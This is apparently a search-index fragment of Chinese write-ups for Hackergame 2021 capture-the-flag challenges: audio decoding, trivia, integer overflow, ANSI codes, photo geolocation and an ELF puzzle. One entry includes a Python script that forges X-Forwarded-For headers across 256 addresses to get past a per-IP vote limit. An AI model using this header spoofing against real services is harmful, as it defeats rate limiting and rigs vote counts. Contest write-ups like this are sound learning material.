\u7528\u65e0\u7ebf\u7535\u7684\u5f62\u5f0f\u53d1\u5c04\u4e86\u51fa\u53bb\u3002</p> <p>\u8003\u8651\u5230\u4fe1\u606f\u7684\u9c81\u68d2\u6027\uff0cX \u540c\u5b66\u4f7f\u7528\u4e86\u65e0\u7ebf\u7535\u4e2d\u60ef\u7528\u7684\u65b9\u6cd5\u6765\u533a\u5206\u5b57\u7b26\u4e32\u4e2d\u8bfb\u97f3\u76f8\u8fd1\u7684\u5b57\u6bcd\u3002\u5373\u4f7f\u5982\u6b64\uff0c\u6253\u7834\u6b21\u5143\u7684\u5f3a\u5927\u80fd\u91cf\u626d\u66f2\u4e86\u65f6\u7a7a\uff0c\u4f7f\u5f97\u6700\u7ec8\u63a5\u53d7\u5230\u7684\u5f55\u97f3\u7684\u901f\u5ea6\u6709\u6240\u6539\u53d8\u3002</p> <p>\uff08\u8fd9\u9898\u5728\u7fa4\u91cc\u770b\u8d77\u6765\u597d\u50cf\u5361\u4e86\u5f88\u591a\u4eba\uff0c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff09 \u9898\u76ee\u4e0b\u8f7d\u4e0b\u6765\u662f\u4e00\u4e2a\u542c\u8d77\u6765\u6742\u4e71\u7684\u97f3\u9891</p> <p>\u9898\u91cc\u6700\u540e\u8bf4\u4e86 \u201c\u6700\u7ec8\u63a5\u53d7\u5230\u7684\u5f55\u97f3\u7684\u901f\u5ea6\u6709\u6240\u6539\u53d8\u201d\uff0c\u6240\u4ee5\u8003\u8651\u5c06\u97f3\u9891\u65f6\u95f4\u62c9\u957f\u3002 \u6700\u5f00\u59cb\u4f7f\u7528\u4e86 Adobe Audition\uff0c\u4f46\u662f\u6548\u679c\u4e0d\u662f\u5f88\u7406\u60f3\uff0c\u5927\u6982\u662f\u91cd\u65b0\u91c7\u6837\u7b49\u4e00\u7cfb\u5217\u7b97\u6cd5\u5bfc\u81f4\u7684 \u6240\u4ee5\u6362\u4e86 Adobe Premier Pro \u76f4\u63a5\u7528\u6bd4\u7387\u62c9\u4f38\u5de5\u5177\u62c9\u957f\u97f3\u9891\uff0c\u8fd8\u662f\u53ef\u4ee5\u542c\u6e05\u7684 \u4e0d\u65ad\u5c1d\u8bd5\u4e4b\u540e\uff0c\u5927\u6982\u653e\u6162\u4e09\u500d\u5de6\u53f3\u5c31\u53ef\u4ee5\u542c\u51fa\u8bfb\u7684\u662f\u82f1\u8bed\u5355\u8bcd\u4e86</p> <p>\u9898\u91cc\u8bf4\u5230\u4e86 \u201c\u8003\u8651\u5230\u4fe1\u606f\u7684\u9c81\u68d2\u6027\uff0cX \u540c\u5b66\u4f7f\u7528\u4e86\u65e0\u7ebf\u7535\u4e2d\u60ef\u7528\u7684\u65b9\u6cd5\u6765\u533a\u5206\u5b57\u7b26\u4e32\u4e2d\u8bfb\u97f3\u76f8\u8fd1\u7684\u5b57\u6bcd\u201d\uff0c\u6240\u4ee5\u5c31\u67e5\u5230\u4e86\u56fd\u9645\u822a\u7a7a\u65e0\u7ebf\u7535\u901a\u8baf26\u4e2a\u82f1\u6587\u5b57\u6bcd\u8bfb\u6cd5 \u7136\u540e\u4ed4\u7ec6\u542c\uff0c\u8fa8\u522b\u6bcf\u4e2a\u5355\u8bcd\u7684\u7b2c\u4e00\u4e2a\u97f3\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86</p>"}, {"location": "writeups/hackergame2021/#pro-max", "title": "\u732b\u54aa\u95ee\u7b54 Pro Max", "text": "<p>\u4e94\u9053\u5201\u94bb\u7684\u9898\u76ee\uff0c\u4f46\u662f\u8fd8\u662f\u597d\u67e5\u5230\u7684\uff0c\u9898\u76ee\u91cc\u4e5f\u8bf4\u4e86\u201c\u89e3\u51fa\u8c1c\u9898\u4e0d\u9700\u8981\u662f\u79d1\u5927\u5728\u6821\u5b66\u751f\u201d</p> <ol> <li>2017 \u5e74\uff0c\u4e2d\u79d1\u5927\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\uff08SEC@USTC\uff09\u5e76\u5165\u4e2d\u79d1\u5927 Linux \u7528\u6237\u534f\u4f1a\uff08USTCLUG\uff09\u3002\u76ee\u524d\uff0c\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u7684\u57df\u540d\uff08sec.ustc.edu.cn\uff09\u5df2\u7ecf\u65e0\u6cd5\u8bbf\u95ee\uff0c\u4f46\u4f60\u80fd\u627e\u5230\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u7684\u793e\u56e2\u7ae0\u7a0b\u5728\u54ea\u4e00\u5929\u7684\u4f1a\u5458\u4ee3\u8868\u5927\u4f1a\u4e0a\u901a\u8fc7\u7684\u5417\uff1f</li> </ol> <p>\u770b\u5230\u4e86 \u201c\u76ee\u524d\uff0c\u5df2\u7ecf\u65e0\u6cd5\u8bbf\u95ee\u201d \u8bf4\u660e\u8fd9\u4e2a\u57df\u540d\u66fe\u7ecf\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\uff0c\u76f4\u63a5\u901a\u8fc7 \u4e92\u8054\u7f51\u7684\u8bb0\u5fc6 archive.org\uff0c\u67e5\u5230\u8fd9\u4e2a\u57df\u540d\u7684\u5386\u53f2\u5b58\u6863\uff0c\u968f\u4fbf\u627e\u4e00\u5929\u5c31\u53ef\u4ee5\u770b\u5230\u4ed6\u4eec\u5b98\u7f51\u4e2d\u7684\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u793e\u56e2\u7ae0\u7a0b\u3002 \u5176\u4e2d\u7b2c\u4e00\u884c\u5c31\u5199\u4e86 \u201c\u672c\u7ae0\u7a0b\u5728 2015 \u5e74 5 \u6708 4 \u65e5\uff0c\u7ecf\u4f1a\u5458\u4ee3\u8868\u5927\u4f1a\u5ba1\u8bae\u901a\u8fc7\u3002\u201d</p> <p>\u6240\u4ee5\u7b54\u6848\u5c31\u662f 20150504</p> <ol> <li>\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 Linux \u7528\u6237\u534f\u4f1a\u5728\u8fd1\u4e94\u5e74\u591a\u5c11\u6b21\u88ab\u8bc4\u4e3a\u6821\u4e94\u661f\u7ea7\u793e\u56e2\uff1f</li> </ol> <p>\u76f4\u63a5\u53bb\u79d1\u5927 LUG \u5b98\u7f51\u7684 Intro \u9875\u9762\uff0c\u5c31\u53ef\u4ee5\u770b\u5230 \u201c\u4e8e 2015 \u5e74 5 \u6708\u30012017 \u5e74 7 \u6708\u30012018 \u5e74 9 \u6708\u30012019 \u5e74 8 \u6708\u53ca 2020 \u5e74 9 \u6708\u88ab\u8bc4\u4e3a\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u4e94\u661f\u7ea7\u5b66\u751f\u793e\u56e2\u3002\u201d \u6240\u4ee5\u662f4\u6b21\uff08x  \u4f46\u662f\u6000\u7591\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u6ca1\u67092021\u5e74\uff0c\u56e0\u4e3a\u90fd\u662f\u57289\u6708\u4efd\u5de6\u53f3\uff0c\u6240\u4ee5\u53ef\u80fd\u662f\u6570\u636e\u6ca1\u66f4\u65b0\uff0c\u8fd9\u98984\u548c5\u90fd\u6709\u53ef\u80fd</p> <p>\u5c1d\u8bd5\u540e\u5f97\u5230\u7b54\u6848\u662f 5</p> <ol> <li>\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 Linux \u7528\u6237\u534f\u4f1a\u4f4d\u4e8e\u897f\u533a\u56fe\u4e66\u9986\u7684\u6d3b\u52a8\u5ba4\u95e8\u53e3\u7684\u724c\u5b50\u4e0a\u201cLUG @ USTC\u201d\u4e0b\u65b9\u7684\u5c0f\u5b57\u662f\uff1f</li> </ol> <p>\u8fd9\u9898\u4e5f\u7b80\u5355\uff0c\u76f4\u63a5\u95ee\u79d1\u5927\u540c\u5b66\u5c31\u597d\u4e86\uff08x  \u7ffb\u4e86 LUG \u7684\u5fae\u4fe1\u516c\u4f17\u53f7\u548c QQ \u5b98\u65b9\u53f7\uff0c\u90fd\u6ca1\u5565\u6536\u83b7\uff0c\u6700\u540e\u53d1\u73b0\u5b98\u7f51\u4e0a\u6709 News\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u65b0\u542f\u7528\u6d3b\u52a8\u5ba4\u7684\u8bdd\uff0c\u4e00\u5b9a\u4f1a\u6709\u4e00\u7bc7\u65b0\u95fb\u7a3f\uff0c\u641c\u7d22\u201c\u56fe\u4e66\u9986\u201d\u5f97\u5230\u4e86\u300c\u897f\u533a\u56fe\u4e66\u9986\u65b0\u6d3b\u52a8\u5ba4\u542f\u7528\u300d\u8fd9\u7bc7\u6587\u7ae0\uff0c\u5f00\u7bc7\u7b2c\u4e00\u5f20\u5927\u56fe\u5c31\u662f\u95e8\u53e3\u724c\u5b50\u7684\u7167\u7247</p> <p>\u6240\u4ee5\u7b54\u6848\u662f Development Team of Library \uff08\u6ce8\u610f\u5927\u5c0f\u5199\uff09</p> <ol> <li>\u5728 SIGBOVIK 2021 \u7684\u4e00\u7bc7\u5173\u4e8e\u4e8c\u8fdb\u5236 Newcomb-Benford \u5b9a\u5f8b\u7684\u8bba\u6587\u4e2d\uff0c\u4f5c\u8005\u4e00\u5171\u5c55\u793a\u4e86\u591a\u5c11\u4e2a\u6570\u636e\u96c6\u5bf9\u5176\u7406\u8bba\u7ed3\u679c\u8fdb\u884c\u9a8c\u8bc1\uff1f</li> </ol> <p>\u5e94\u8be5\u6ca1\u5fc5\u8981\u641c\u8c37\u6b4c\u5b66\u672f\u4e4b\u7c7b\u7684\uff0c\u76f4\u63a5\u5fc5\u5e94\u67e5 \u201cSIGBOVIK Newcomb-Benford\u201d \u5c31\u53ef\u4ee5\u627e\u5230 SIGBOVIK \u7684\u8fd9\u4e00\u7bc7\u5927\u6587\u7ae0\u5408\u96c6\uff0c\u518d\u641c\u7d22 Newcomb \u5c31\u53ef\u4ee5\u770b\u5230\u9898\u76ee\u91cc\u8bf4\u7684\u8bba\u6587\u4e86\u3002 \u5168\u6587\u4e5f\u4e0d\u957f\uff0c\u53ea\u6709\u56db\u9875\uff0c\u540e\u4e24\u9875\u5168\u662f\u6570\u636e\u7684\u56fe\uff0c\u6570\u4e00\u4e0b\uff0c\u4e00\u5171\u670913\u5e45</p> <p>\u6240\u4ee5\u7b54\u6848\u662f 13</p> <ol> <li>\u4e0d\u4e25\u683c\u9075\u5faa\u534f\u8bae\u89c4\u8303\u7684\u64cd\u4f5c\u7740\u5b9e\u4ee4\u4eba\u751f\u538c\uff0c\u597d\u5728 IETF \u4e8e 2021 \u5e74\u6210\u7acb\u4e86 Protocol Police \u4ee5\u76d1\u7763\u5e76\u60e9\u6212\u6240\u6709\u8fdd\u80cc RFC \u6587\u6863\u7684\u884c\u4e3a\u4e2a\u4f53\u3002\u5047\u5982\u4f60\u53d1\u73b0\u4e86\u67d0\u4f4d\u540c\u5b66\u53ef\u80fd\u8fdd\u53cd\u4e86\u534f\u8bae\u89c4\u8303\uff0c\u6839\u636e Protocol Police \u76f8\u5173\u6587\u6863\u4e2d\u89c4\u5b9a\u7684\u4e3e\u62a5\u65b9\u6cd5\uff0c\u4f60\u5e94\u8be5\u5c06\u4f60\u7684\u4e3e\u62a5\u4fe1\u53d1\u5f80\u4f55\u5904\uff1f</li> </ol> <p>\u6ca1\u5565\u597d\u8bf4\u7684\uff0c\u76f4\u63a5\u67e5\uff0c\u7b54\u6848 /dev/null</p> <p>\u7136\u540e\u63d0\u4ea4\u5c31\u53ef\u4ee5\u5f97\u5230 flag</p>"}, {"location": "writeups/hackergame2021/#_4", "title": "\u5356\u74dc", "text": "<p>\u9898\u76ee\u91cc\u6bd4\u8f83\u91cd\u8981\u7684\u8bdd\u5c31\u662f\uff1a</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5f53\u79f0\u7684\u6570\u5b57\u53d8\u4e3a\u6d6e\u70b9\u6570\u800c\u4e0d\u662f\u6574\u6570\u65f6\uff0cHQ \u4e0d\u4f1a\u8ba4\u53ef\u6700\u7ec8\u7684\u79f0\u91cd\u7ed3\u679c\u3002</p> <p>\u9898\u76ee\u7684\u76ee\u7684\u4e5f\u5f88\u660e\u786e\uff0c\u7528\u4e00\u58069\u548c\u4e00\u58066\u52a0\u8d77\u6765\u5f97\u523020\u3002\u80af\u5b9a\u4e0d\u80fd \u50cf\u534e\u5f3a\u4e00\u6837 \u5288\u74dc\uff0c\u6240\u4ee5\u8f93\u5165\u4e00\u5b9a\u662f\u6574\u6570 \u90a3\u5c31\u53ef\u4ee5\u8003\u8651\u6ea2\u51fa \u4f46\u662f\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u7ed9\u7684\u6570\u5b57\u592a\u5927\uff0c\u5c31\u4f1a\u4f7f\u7ed3\u679c\u6ea2\u51fa\u5230\u6d6e\u70b9\u6570\uff0c\u8fd9\u4e0d\u662f\u60f3\u8981\u7684\uff08\u56e0\u4e3a\u5373\u4f7f\u51d1\u5230\u4e8620.0\u4e5f\u4e0d\u6b63\u786e\uff09</p> <p>\u90a3\u5982\u679c\u6570\u5b57\u518d\u5927\u5462\uff0c\u6bd4\u5982 2000000000000000000\uff0818\u4e2a0\uff09\u4e2a9\u65a4\u7684\u74dc\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u65f6\u76f4\u63a5\u6ea2\u51fa\u5230\u4e86\u8d1f\u6574\u578b -446744073709551616 \u518d\u8865\u4e0a 49638230412172000 \u4e2a9\u65a4\u7684\u74dc\u5c31\u53ef\u4ee5\u5f97\u5230 -3616\uff0c\u52a0\u4e0a20\u53ef\u4ee5\u88ab6\u6574\u9664\uff0c\u6240\u4ee5\u518d\u52a0\u4e0a606\u4e2a6\u65a4\u7684\u74dc\u5c31\u53ef\u4ee5\u5f97\u5230 20</p> <p>\u606d\u559c\u4f60\u9003\u8fc7\u4e00\u52ab\uff01\u534e\u5f3a\uff5e\u534e\u5f3a\uff01</p>"}, {"location": "writeups/hackergame2021/#_5", "title": "\u900f\u660e\u7684\u6587\u4ef6", "text": "<p>\u4e00\u4e2a\u900f\u660e\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5728\u7ec8\u7aef\u4e2d\u5c55\u793a\u4e00\u4e2a\u4e94\u989c\u516d\u8272\u7684 flag\u3002</p> <p>\u53ef\u80fd\u662f\u5728 cmd.exe \u7b49\u52a3\u8d28\u7ec8\u7aef\u4e2d\u88ab\u957f\u671f\u4f7f\u7528\u7684\u539f\u56e0\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5931\u53bb\u4e86\u4e00\u4e9b\u91cd\u8981\u6210\u5206\uff0c\u53d8\u6210\u4e86\u4e00\u5806\u4e71\u7801\uff0c\u4e5f\u4e0d\u4f1a\u518d\u663e\u793a\u51fa flag \u4e86\u3002</p> <p>\u6ce8\u610f\uff1aflag \u5185\u90e8\u7684\u5b57\u7b26\u5168\u90e8\u4e3a\u5c0f\u5199\u5b57\u6bcd\u3002</p> <p>\u62ff\u5230\u6587\u4ef6\uff0c\u770b\u5230\u91cc\u9762\u597d\u591a <code>[ ; m</code> \u4e4b\u7c7b\u7684\uff0c\u518d\u7ed3\u5408\u7ec8\u7aef\u4e2d\u8f93\u51fa\u5e26\u989c\u8272\u6587\u5b57\u7684 <code>\\033[...m;</code> \u4e4b\u7c7b\u7684\u65b9\u6cd5\uff0c\u4ee5\u53ca\u9898\u76ee\u4e2d\u7684 \u201c\u5931\u53bb\u4e86\u4e00\u4e9b\u91cd\u8981\u6210\u5206\u201d \u6240\u4ee5\u76f4\u63a5\u5c1d\u8bd5\u628a <code>[</code> \u5168\u5c40\u66ff\u6362\u4e3a <code>\\033[</code>\uff0c\u7136\u540e\u590d\u5236\u5230 python \u4e2d print\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u795e\u5947\u7684\u4e00\u5e55\u4e86\uff08\u5176\u5b9e\u5e76\u6ca1\u5b8c\u5168\u505a\u5b8c\uff0c\u4f46\u662f\u53ef\u4ee5\u5df2\u7ecf\u770b\u4e86\uff09  \u7136\u540e\u8bfb\u51fa flag \u5373\u53ef\uff08\u5168\u662f\u5c0f\u5199\u5b57\u6bcd\uff09</p>"}, {"location": "writeups/hackergame2021/#_6", "title": "\u65c5\u884c\u7167\u7247", "text": "<p>\u4f60\u7684\u5b66\u957f\u51b3\u5b9a\u6765\u4e00\u573a\u8bf4\u8d70\u5c31\u8d70\u7684\u65c5\u884c\u3002\u901a\u8fc7\u4ed6\u53d1\u7ed9\u4f60\u7684\u7167\u7247\u6765\u770b\uff0c\u4ed6\u5e94\u8be5\u662f\u5728\u9152\u5e97\u4f4f\u4e0b\u4e86\u3002</p> <p>\u4ece\u7167\u7247\u6765\u770b\uff0c\u9152\u5e97\u4f3c\u4e4e\u5728\u5c0f\u533a\u7684\u4e00\u680b\u9ad8\u697c\u91cc\uff0c\u9644\u8fd1\u8fd8\u6709\u4e00\u5bb6 KFC \u5206\u5e97\u3002\u7a81\u7136\uff0c\u4f60\u610f\u8bc6\u5230\u7167\u7247\u91cc\u900f\u9732\u51fa\u6765\u7684\u4fe1\u606f\u6bd4\u8868\u9762\u4e0a\u770b\u8d77\u6765\u7684\u8981\u591a\u3002</p> <p>\u8bf7\u89c2\u5bdf\u7167\u7247\u5e76\u7b54\u5bf9\u5168\u90e8 5 \u9053\u9898\u4ee5\u83b7\u53d6 flag\u3002\u6ce8\u610f\uff1a\u56fe\u7247\u672a\u5728\u5176\u4ed6\u5730\u65b9\u516c\u5f00\u53d1\u5e03\u8fc7\uff0c\u4e5f\u672a\u91c7\u53d6\u4efb\u4f55\u9690\u5199\u63aa\u65bd\uff08\u901a\u8fc7\u624b\u673a\u62cd\u6444\u5c4f\u5e55\u4ea6\u53ef\u7b54\u9898\uff09\u3002 </p> <p>\u201c\u624b\u673a\u62cd\u6444\u5c4f\u5e55\u4ea6\u53ef\u7b54\u9898\u201d\uff0c\u6240\u4ee5\u7167\u7247\u4e2d\u6ca1\u6709\u4efb\u4f55\u5730\u5740\u7684\u5143\u4fe1\u606f\uff0c\u53ea\u80fd\u9760\u770b\u56fe \u7ebf\u7d22\uff1a\u6d77\u8fb9\u3001KFC\u3001\u9ad8\u697c\u3001\u5927\u77f3\u5934\u3001\u505c\u8f66\u4f4d</p> <p>\u5148\u770b\u90a3\u4e2aKFC\uff0c\u5927\u6982\u662f\u4e2a\u7f51\u7ea2\u5e97\uff0c\u6240\u4ee5\u641c\u7d22 \u201c\u7f51\u7ea2 \u6d77\u8fb9 KFC\u201d\uff0c\u67e5\u5230\u4e86\u79e6\u7687\u5c9b\uff0c\u800c\u4e14\u4e5f\u662f\u6d77\u8fb9 \u518d\u8fdb\u4e00\u6b65\u770b\u5730\u56fe\u548c\u8857\u666f\u5730\u56fe\u5c31\u53ef\u4ee5\u786e\u5b9a\u5730\u70b9\u5728 \u79e6\u7687\u5c9b\u65b0\u6fb3\u6d77\u5e95\u4e16\u754c</p> <p>\u7136\u540e\u662f5\u4e2a\u95ee\u9898</p> <p>\u8be5\u7167\u7247\u62cd\u6444\u8005\u7684\u9762\u671d\u65b9\u5411\u4e3a\uff1a</p> <p>\u6839\u636e\u5730\u56fe\uff0c\u5bf9\u6bd4\u4e00\u4e0b\u5c31\u53ef\u4ee5\u5f97\u5230\uff0c\u9762\u671d\u65b9\u5411\u662f \u4e1c\u5357</p> <p>\u8be5\u7167\u7247\u7684\u62cd\u6444\u65f6\u95f4\u5927\u81f4\u4e3a\uff1a</p> <p>\u6839\u636e\u9009\u9879\u91cc\u7684\u65f6\u95f4\uff0c\u4e0b\u5348\u662f\u4e24\u70b9\u534a\u5de6\u53f3\uff0c\u800c\u5728\u4e1c\u5317\u7684\u4e24\u70b9\u534a\u5de6\u53f3\u5176\u5b9e\u548c\u4e2d\u5348\u5dee\u4e0d\u591a\uff0c\u5f71\u5b50\u548c\u5149\u6e29\u4e5f\u4e0d\u592a\u50cf\u8fd9\u4e2a\u6837\u5b50\uff0c\u6240\u4ee5\u53ef\u4ee5\u786e\u5b9a\u65f6\u95f4\u5927\u81f4\u662f \u508d\u665a</p> <p>\u8be5\u7167\u7247\u7684\u62cd\u6444\u8005\u6240\u5728\u697c\u5c42\u4e3a\uff1a</p> <p>\u4e0d\u597d\u786e\u5b9a\uff0c\u4f46\u662f\u7b54\u6848\u53ef\u4ee5\u4ea4\u5f88\u591a\u6b21\uff0c\u6240\u4ee5\u4ece9\u5c42\u5de6\u53f3\u4f9d\u6b21\u8bd5\u5c31\u53ef\u4ee5\u4e86\uff0c\u6700\u540e\u5f97\u5230\u697c\u5c42\u662f 14</p> <p>\u8be5\u7167\u7247\u5de6\u4e0a\u89d2 KFC \u5206\u5e97\u7684\u7535\u8bdd\u53f7\u7801\u662f\uff1a</p> <p>\u76f4\u63a5\u7528\u5730\u56fe\u8f6f\u4ef6\u641c \u201c\u79e6\u7687\u5c9b\u65b0\u6fb3 KFC\u201d \u5c31\u53ef\u4ee5\u67e5\u5230\u90a3\u5bb6\u5e97\u94fa\uff0c\u4e5f\u7ed9\u4e86\u7535\u8bdd\uff0c\u6216\u8005\u641c\u7d22 \u201d\u7f51\u7ea2 \u6d77\u8fb9 KFC\u201c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u7535\u8bdd\uff1a0335-7168800</p> <p>\u8be5\u7167\u7247\u5de6\u4e0a\u89d2 KFC \u5206\u5e97\u5de6\u4fa7\u5efa\u7b51\u6709\u4e09\u4e2a\u6c34\u5e73\u6392\u5217\u7684\u6c49\u5b57\uff0c\u5b83\u4eec\u662f\uff1a</p> <p>\u901a\u8fc7\u8857\u666f\u5730\u56fe\u5c31\u53ef\u4ee5\u770b\u5230 KFC \u5de6\u8fb9\u7684\u5efa\u7b51\u4e0a\u5199\u4e86 \u6d77\u8c5a\u9986</p>"}, {"location": "writeups/hackergame2021/#flag", "title": "FLAG \u52a9\u529b\u5927\u7ea2\u5305", "text": "<p>\u53c2\u4e0e\u6d3b\u52a8\uff0c\u52a9\u529b\u62bd\u5956\uff01\u96c6\u6ee1 1 \u4e2a flag\uff0c\u5373\u53ef\u63d0\u53d6 1 \u4e2a flag\u3002</p> <p>\u606d\u559c\u4f60\u79ef\u6512\u5230 0.5\u2026\u2026 \u4e2a flag\uff0c  \u5269\u4f59\u65f6\u95f4\uff1a10\u520600\u79d2</p> <p>\u5df2\u6709 0 \u4f4d\u597d\u53cb\u4e3a\u60a8\u52a9\u529b\u3002</p> <p>\u5c06\u5982\u4e0b\u94fe\u63a5\u5206\u4eab\u7ed9\u597d\u53cb\uff0c\u53ef\u4ee5\u83b7\u5f97\u597d\u53cb\u52a9\u529b\uff0c\u83b7\u5f97\u66f4\u591a flag\uff1a\u2026\u2026</p> <p>\u8001\u5e76\u5915\u5915\u4e86\uff0c\u7ecf\u8fc7\u4e00\u4e9b\u6d4b\u8bd5\u548c\u770b\u89c4\u5219\u53ef\u4ee5\u77e5\u9053\uff0cip \u5728\u540c\u4e00 /8 \u7f51\u6bb5\u7684\u7528\u6237\u88ab\u89c6\u4e3a\u540c\u4e00\u7528\u6237\uff0c\u5373 ip \u5730\u5740\u7684\u7b2c\u4e00\u4e2a\u70b9\u524d\u9762\u7684\u6570\u5b57\u4e0d\u4e00\u6837\u624d\u662f\u4e0d\u540c\u7528\u6237 \u518d\u7528\u865a\u62df\u673a\u548c\u624b\u673a\u8bd5\u4e00\u4e0b\uff0c\u53d1\u73b0\u6bcf\u4e2a\u7528\u6237\u589e\u52a0\u7684 flag \u6570\u91cf\u5f88\u5c0f \u6240\u4ee5\u63a8\u6d4b\u9700\u8981200+\u4e2a ip \u5730\u5740\uff0c\u80af\u5b9a\u4e0d\u4f1a\u8981\u771f\u7684\u8f6c\u53d1\uff0c\u800c\u4e14\u4e5f\u5f88\u96be\u51d1\u51fa\u5f88\u591a\u4e0d\u5728\u540c\u4e00 /8 \u7f51\u6bb5\u7684 ip</p> <p>\u4e8e\u662f\u5728 BurpSuite \u91cc\u9762\u6293\u5305\u53ef\u4ee5\u770b\u5230\uff0c\u6bcf\u6b21\u70b9\u51fb\u201c\u52a9\u529b\u201d\u90fd\u4f1a\u53d1\u9001\u4e00\u4e2a\u5230\u52a9\u529b\u94fe\u63a5\u7684 POST\uff0c\u5185\u5bb9\u4e3a ip \u5730\u5740  \u7136\u540e\u5c06\u5176\u53d1\u9001\u5230 Repeater \u4e2d\uff0c\u5c1d\u8bd5\u66f4\u6539 ip \u5730\u5740\uff0c\u5f97\u5230\u7684 Response \u4e2d\u8bf4 \u201c\u5931\u8d25\uff01\u68c0\u6d4b\u5230\u524d\u540e\u7aef\u68c0\u6d4b IPv4 \u5730\u5740\u4e0d\u5339\u914d\u201d</p> <p>\u6240\u4ee5\u4ec5\u4ec5\u66f4\u6539 POST \u5185\u5bb9\u7684 ip \u662f\u4e0d\u591f\u7684\uff0c\u800c\u63d0\u4f9b\u7ed9\u68c0\u6d4b\u7684\u5185\u5bb9\u4e5f\u4ec5\u4ec5\u662f\u4e00\u4e2a POST\uff0c\u6240\u4ee5\u53ef\u4ee5\u66f4\u6539 POST \u5934\uff0c\u6dfb\u52a0 X-Forwarded-For \u7136\u540e\u4f7f\u7528 python \u5c31\u53ef\u4ee5\u5faa\u73af\u53d1\u9001 POST \u5e76\u4f2a\u9020 ip \u5730\u5740\u5f97\u5230256\u4e2a\u52a9\u529b\u4e86\uff0c\u521a\u597d\u8fbe\u52301\u4e2aflag\uff1a \uff08\u8981\u6ce8\u610f sleep \u4e00\u6bb5\u65f6\u95f4\uff0c\u4e0d\u7136\u4f1a\u51fa\u73b0\u64cd\u4f5c\u8fc7\u5feb\u62d2\u7edd\u7684\u60c5\u51b5\uff1b\u4e5f\u4e0d\u8981 sleep \u8fc7\u957f\uff0c\u5426\u5219\u8d85\u8fc710\u5206\u949f flag \u5c31\u65e0\u6548\u4e86\uff09 <pre><code>import requests \nimport time\nfrom tqdm import tqdm\n\nurl = \"http://202.38.93.111:10888/invite/...\"\n\nwith tqdm(total=256) as pbar:\n    for i in range(256):\n        res = requests.post(url, data={\"ip\": f\"{i}.0.0.0\"}, headers={\"X-Forwarded-For\": f\"{i}.0.0.0\"})\n        if \"\u6210\u529f\" not in res.text:\n            print(\"[x] \u5931\u8d25\")\n            print(res.text)\n        time.sleep(1.5)\n        pbar.update(1)\n</code></pre></p>"}, {"location": "writeups/hackergame2021/#amnesia", "title": "Amnesia", "text": ""}, {"location": "writeups/hackergame2021/#_7", "title": "\u8f7b\u5ea6\u5931\u5fc6", "text": "<p>\u4f60\u7684\u7a0b\u5e8f\u53ea\u9700\u8981\u8f93\u51fa\u5b57\u7b26\u4e32 Hello, world!\uff08\u7ed3\u5c3e\u6709\u65e0\u6362\u884c\u5747\u53ef\uff09\u5e76\u6b63\u5e38\u7ed3\u675f\u3002</p> <p>\u7f16\u8bd1\u6307\u4ee4\uff1a<code>gcc -O file.c -m32</code></p> <p>\u8fd0\u884c\u6307\u4ee4\uff1a<code>./a.out</code></p> <p>\u7f16\u8bd1\u540e ELF \u6587\u4ef6\u7684 .data \u548c .rodata \u6bb5\u4f1a\u88ab\u6e05\u96f6\u3002</p> <p>ELF\uff08Executable and Linkable Format\uff09\u662f Linux \u4e0b\u5e38\u7528\u7684\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\uff0c\u5176\u4e2d\u6709\u5f88\u591a\u4e0d\u540c\u7684\u8282\uff1a</p> <ul> <li><code>.text</code> \u8282\uff1a\u7a0b\u5e8f\u8fd0\u884c\u9700\u8981\u7684\u4ee3\u7801</li> <li><code>.data</code> \u8282\uff1a\u5b58\u653e\u53ef\u4fee\u6539\u7684\u6570\u636e\uff0c\u4e00\u822c\u662f\u975e const \u5168\u5c40\u53d8\u91cf\u548c\u9759\u6001\u53d8\u91cf</li> <li><code>.rodata</code> \u8282\uff1a\u5373 read only data\uff0c\u4e00\u822c\u662f\u5e38\u91cf\u6216\u8005\u5b57\u7b26\u4e32</li> <li><code>.bss</code> \u8282\uff1a\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u53d8\u91cf</li> <li>\u2026\u2026</li> </ul> <p>\u800c\u8fd9\u9053\u9898\u76ee\u5219\u662f\u5728\u7f16\u8bd1\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6 a.out \u540e\uff0c\u6e05\u7a7a .data \u548c .rodata \u9996\u5148\u4e0d\u59a8\u6b63\u5e38\u7f16\u5199\u4e00\u4e2a\u8f93\u51fa \u201cHello, world!\u201d \u7684\u7a0b\u5e8f\uff1a <pre><code>printf(\"Hello, world!\\n\");\n</code></pre> \u7136\u540e\u7f16\u8bd1\uff0c\u518d\u62d6\u5230 IDA \u91cc   \u53ef\u4ee5\u53d1\u73b0\uff0c\u6b64\u65f6\u7684 \"Hello, world!\" \u88ab\u653e\u5230\u4e86 .rodata \u8282\u4e2d\uff0c\u4f1a\u88ab\u6e05\u9664\u6389\uff0c\u6240\u4ee5\u8fd9\u6837\u5199\u4e0d\u884c</p> <p>\u76f4\u63a5\u4f7f\u7528\u5b57\u7b26\u4e32\u4f1a\u88ab\u653e\u5230 .rodata \u4e2d\u6e05\u9664\uff0c\u5199\u6210\u5168\u5c40\u53d8\u91cf\u53c8\u4f1a\u653e\u5230 .data \u4e2d \u4f46\u662f\uff0c\u5982\u679c\u5199\u6210\u5c40\u90e8\u53d8\u91cf\u5462\uff1a <pre><code>char str[] = \"Hello, world!\\n\";\nprintf(str);\n</code></pre> \u7f16\u8bd1\uff0c\u62d6\u5230 IDA \u91cc  